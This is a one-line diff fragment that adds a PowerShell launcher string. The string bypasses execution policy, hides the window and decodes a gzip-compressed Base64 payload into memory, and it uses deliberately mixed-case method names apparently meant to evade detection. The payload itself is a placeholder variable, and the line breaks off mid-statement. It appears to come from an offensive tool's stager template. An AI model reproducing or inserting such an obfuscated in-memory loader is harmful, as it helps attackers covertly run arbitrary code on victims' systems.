@@ -1,0 +1,1 @@
+"powershell.exe -ep bypass -Window Hidden -c `""`$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream"
